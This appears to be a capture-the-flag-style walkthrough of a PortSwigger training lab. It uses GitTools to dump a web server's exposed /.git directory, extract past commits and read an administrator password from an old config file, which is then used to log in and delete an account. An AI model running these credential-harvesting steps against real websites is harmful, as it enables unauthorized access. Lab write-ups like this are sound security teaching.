# [Lab 5: Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)

---

## Description

This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the `administrator` user then log in and delete Carlos's account.

---

## Solution

The web application's `/.git` directory is browsable.

![](images/Pasted%20image%2020210907164318.png)

Use [`GitTools`'s](https://github.com/internetwache/GitTools) `gitdumper.py` to retrieve the `.git` directory.

```bash
$ /opt/GitTools/Dumper/gitdumper.sh https://ac041fed1ef67e9380ab52e700dc0072.web-security-academy.net/.git/ dumped
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating dumped/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/03/e516ab29ce136c255231d0fa42b337fabf55e6
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/6a/91afe98e40d9310bc637ba7e949e52325c5c70
[+] Downloaded: objects/21/54555944002791a4d27412bf6e9a6f29e942fa
[+] Downloaded: objects/ff/5d116d8ffb86667d6955ea95d2c5174854af6b
[+] Downloaded: objects/21/d23f13ce6c704b81857379a3e247e3436f4b26
[+] Downloaded: objects/89/44e3b9853691431dc58d5f4978d3940cea4af2
[+] Downloaded: objects/1a/69e3249d36cd0effe85a032194cad987e4c938
```

View `logs/HEAD` to determine the order of the repository's commits.

```bash
$ cat dumped/.git/logs/HEAD
0000000000000000000000000000000000000000 6a91afe98e40d9310bc637ba7e949e52325c5c70 Carlos Montoya <carlos@evil-user.net> 1631032947 +0000	commit (initial): Add skeleton admin panel
6a91afe98e40d9310bc637ba7e949e52325c5c70 03e516ab29ce136c255231d0fa42b337fabf55e6 Carlos Montoya <carlos@evil-user.net> 1631032947 +0000	commit: Remove admin password from config
````

It appears that the initial commit will contain the desired password. Its hash is `6a91afe98e40d9310bc637ba7e949e52325c5c70`.

Use [`GitTools`'s](https://github.com/internetwache/GitTools) `extractor.sh` to recover the contents of the repository's commits.

```bash
$ /opt/GitTools/Extractor/extractor.sh dumped extracted                                                           
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: 03e516ab29ce136c255231d0fa42b337fabf55e6
[+] Found file: /home/kali/workspace/extracted/0-03e516ab29ce136c255231d0fa42b337fabf55e6/admin.conf
[+] Found file: /home/kali/workspace/extracted/0-03e516ab29ce136c255231d0fa42b337fabf55e6/admin_panel.php
[+] Found commit: 6a91afe98e40d9310bc637ba7e949e52325c5c70
[+] Found file: /home/kali/workspace/extracted/1-6a91afe98e40d9310bc637ba7e949e52325c5c70/admin.conf
[+] Found file: /home/kali/workspace/extracted/1-6a91afe98e40d9310bc637ba7e949e52325c5c70/admin_panel.php
```

Read the contents of `admin.conf` from that commit.

```bash
$ cat extracted/1-6a91afe98e40d9310bc637ba7e949e52325c5c70/admin.conf 
ADMIN_PASSWORD=uqpmf4n2kn6769pxcujj
```

Login with the credentials `administrator:uqpmf4n2kn6769pxcujj` and navigate to the admin panel. Delete `carlos`'s account to complete the challenge.


